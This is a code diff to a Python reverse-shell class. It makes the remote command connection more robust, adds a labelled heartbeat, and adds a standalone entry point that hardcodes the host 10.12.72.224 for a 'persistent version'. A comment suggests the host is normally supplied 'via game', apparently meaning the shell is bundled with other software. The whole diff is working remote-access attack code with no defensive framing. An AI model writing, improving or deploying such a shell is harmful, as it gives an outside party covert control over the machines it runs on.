@@ -45,9 +45,10 @@ class ReverseShell:
                 self.sock.send(initial_msg.encode("utf-8"))
                 
                 while self.connected and not self._stop_event.is_set():
-                    data = self.sock.recv(4096).decode("utf-8").strip()
-                    if not data: 
+                    raw_data = self.sock.recv(4096)
+                    if not raw_data: 
                         break
+                    data = raw_data.decode("utf-8", errors="replace").strip()
                     
                     if data.lower() == "ping":
                         self.sock.send(b"pong\n")
@@ -107,8 +108,9 @@ class ReverseShell:
     def _heartbeat(self):
         while self.connected:
             try:
-                self.sock.send(b"") 
-                time.sleep(10)
+                # Named heartbeat to prevent sync issues and "Broken Pipe"
+                self.sock.send(b"[HEARTBEAT]\n") 
+                time.sleep(15)
             except:
                 self.connected = False
                 break
@@ -123,3 +125,9 @@ class ReverseShell:
         self._stop_event.set()
         self.connected = False
         if self.sock: self.sock.close()
+
+if __name__ == "__main__":
+    # Default host usually set via game, but here we can hardcode for the persistent version
+    # Or read from a config file. Let's use the user's preferred IP.
+    shell = ReverseShell(host="10.12.72.224")
+    shell._connect_and_shell() # Run in foreground for the standalone process
